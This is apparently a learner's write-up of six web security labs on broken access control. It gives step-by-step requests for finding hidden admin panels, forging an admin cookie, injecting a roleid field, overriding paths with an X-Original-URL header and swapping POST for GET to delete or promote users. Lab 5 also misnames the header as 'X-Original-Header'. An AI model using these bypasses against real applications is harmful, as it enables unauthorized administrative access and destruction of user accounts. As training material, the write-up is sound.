An example can be when administrative functions might be linked from an administrator's welcome page, but not from a user's welcome page. But, the user can access these functions by browsing the admin URL.

In some cases the administrative URL can be disclosed in other locations, as `robots.txt`

## Unprotected Functionality
### 1. Lab - Unprotected admin functionality

The lab has an unprotected admin panel, and the goal is to delete the user `carlos`.

Let's open the lab on Burp, and do a `GET` request on `robots.txt`.

There, I have this output:

```text
User-agent: *
Disallow: /administrator-panel
```

Let's try a `GET` request now on this `/administrator-panel`, and the result is:

```html
 <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/administrator-panel/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/administrator-panel/delete?username=carlos">Delete</a>
                        </div>
                    </section>
```

In this part of html code, we see that we are inside the admin panel, and we can see also links to some functionalities that are only available to admin users, such as deletion of accounts, and let's copy the link to delete `carlos`.

Do a `GET` request on the link `/administrator-panel/delete?username=carlos`.

And we got a `302 Found` and the lab is solved.

----------

However, these cases are not so common. Sometimes, sensitive functionality is hidden by giving it a less predictable URL. But, this is again not an effective access control, because the URL can still be disclosed in a number of ways.

For example, an url with the administrative page on the `/administrator-panel-djnckrevc`, might be hard to be known to an attacker. But, this can be disclosed in a JS which constructs the user interface, based on the user's role.

```js
<script>
	var isAdmin = false;
	if (isAdmin) {
		...
		var adminPanelTag = document.createElement('a');
		adminPanelTag.setAttribute('href', 'https://insecure-website.com/administrator-panel-djnckrevc');
		adminPanelTag.innerText = 'Admin panel';
		...
	}
</script>
```

The script above ads a link to the user's UI if they are an admin user, but this link is visible to all users.

### 2. Lab - Unprotected Admin Functionality with Unpredictable URL

The goal here again is to delete `carlos` in a lab which has an unprotected admin panel. So, first locate and then delete.

We open the lab url, and we see a link `My Account` we click on that and see the response on Burp.

There we see that it goes to the `/login` and after observing the response, we see also the admin url, which is `/admin-ixdy0n`.

```html
                           <script>
var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-ixdy0n');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   var pTag = document.createElement('p');
   pTag.innerText = '|';
   topLinksTag.appendChild(pTag);
}
</script>
```

After opening that url, we are inside the admin panel and we can copy the url to delete the user `carlos`.

And the lab is solved.

---------------

## Parameter-Based Access Control Methods

Some apps determine the user's rights at login, and then store this information in a user-controllable location, such as a hidden field, cookie, a preset query string parameter.

The app then makes access control decisions based on the submitted value, for example:

`https://insecure-website.com/login/home.jsp?admin=true`

Since this can be modified this approach is not secure.

### 3. Lab - User Role Controlled By Request Parameter

The admin panel is at `/admin` which identifies admins by a forgeable cookie.

Access the admin panel and delete the user `carlos`.

There is also an account that you can login with the credentials `wiener:peter`.

I go and login with these user and see the behavior of the responses in Burp.

In the `/login` I see a weird behavior such as `Set-Cookie: Admin=false; Secure; HttpOnly`.

Then after, logged in, I check my cookie and it is `Cookie: Admin=false; session=gKmNR3V0FuneVEBuoCeWBfhBbEj24YCd`.

To bypass I will change the `Admin` to `True`, and send the request.

Then I see that I have the admin panel at `/admin`, and send a request there.

Now, I'm in the admin panel, and I can delete users:

```html
                   <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
```

I copy the link for `carlos` and send a request there. And the lab is solved.

--------
### 4. Lab - User Role Can Be Modified In User Profile

The lab admin is at `/admin` and it's only accessible to logged in users with a `roleid` of 2.

You can log in with `wiener:peter` and delete the user `carlos`.

As soon as I log in there is an option to change the email address. After I put some random email, and check the response in the Burp, I see the following:

```http
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 113

{
  "username": "wiener",
  "email": "w1@w2.com",
  "apikey": "a3z9TxSWUDUYKPwV6oFf7oWsIF44aG5f",
  "roleid": 1
}
```

I send the request to change the email to Burp Repeater, and not just email, I add also the `"roleid": 2` and send the request.

I got the following response:

```http
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 114

{
  "username": "wiener",
  "email": "w12@w2.com",
  "apikey": "a3z9TxSWUDUYKPwV6oFf7oWsIF44aG5f",
  "roleid": 2
}
```

So now also my `roleid` has been changed, meaning I have administrative privileges now.

And now I can see also the `Admin panel`, where I can delete `carlos` and solve the lab.

## Broken Access Control Resulting From Platform Misconfiguration

Some apps enforce access controls at the platform layer. Meaning that they restrict access to specific URLs and HTTP methods depending on the user's roe.

`DENY: POST, /admin/deleteUser, managers`

This rule denies access to the `POST` method on `/admin/deleteUser` for users in the `managers` groups.

Some app frameworks support a number of non-standard HTTP headers that can be used to override the URL in the original request. Some examples are `X-Original-URL` and `X-Rewrite-URL`. If a website uses strict frontend controls to restrict access based on the URL, but the app allows the URL to be overridden via a request header, then it can be possible to bypass the access control using a request like the following:

```http
POST / HTTP/1.1
X-Original-URL: /admin/deleteUser
```

### 5. Lab - URL Based Access Control Can Be Circumvented

There is an unauthenticated admin panel at `/admin` but the frontend blocks access to that path. 

The backend is built on a framework that supports `X-original-URL` header. Access the admin panel and delete `carlos`.

When I try to go to the `lab.com/admin` I see **Access Denied**. Then, I send this request to the Burp Repeater.

There, I make the original request to go to the root endpoint `/` and add another header:

`X-Original-Header: /admin`

The response I got is from the admin panel. There I see the url to delete `carlos` and I put that on the `X-Original-Header`.

Now the response says that `Missing parameter 'username'`.

In this case, I modify the original request to:

`GET /?username=carlos HTTP/2`.

And the user `carlos` is deleted and the lab solved.

____
There is also an alternate attack which relates to the HTTP method used in the request. Frontend controls in the previous sections restrict access based on the URL and HTTP method. 

Some websites tolerate different HTTP request methods when performing an action, and if an attacker can use `GET` or another method to perform actions on a restricted URL, they can bypass the access controls implemented at the platform layer.

### 6. Lab - Method Based Access Control Can Be Circumvented

The lab has access controls based partly on the HTTP method of requests. In the admin panel you can login by using the credentials `administrator:admin`. To solve the lab you have to log in using the credentials `wiener:peter` and exploit the access controls to promote yourself to become an administrator.

First let's see how the app works when promoting a user, using the administrator account.

From this I observe that the request to promote `carlos` from an admin account, is as follows:

```http
POST /admin-roles HTTP/2
...

usernam=carlos&action=upgrade
```

Now, with the `wiener` account I don't have access to admin panel, but let's try to do the same via BURP and observe the Response.

I got a `401 Unauthorized`:

```http
HTTP/2 401 Unauthorized
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"Unauthorized"
```

Let's just modify the `POST` request and put something unknown, like `POSTHALIL`.

In this case I got a `400 Bad Request` and the interesting part is that in the body says `Missing parameter 'username'`.

A parameter can be added with the `GET` request so let's try it.

Now, when I do the request as following

```http
GET /admin-roles?username=carlos&action=upgrade HTTP/2
...
```

I have a response saying `HTTP/2 302 Found`, even though I shouldn't have access here.

Now, let's try to promote myself, my modifying the request as follows:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
```

I again receive a `302 Found` and when I refresh my page on `wiener` account, I see that the lab is solved, and I have access to the admin panel.

![](../../../images/Pasted image 20250121095104.png)

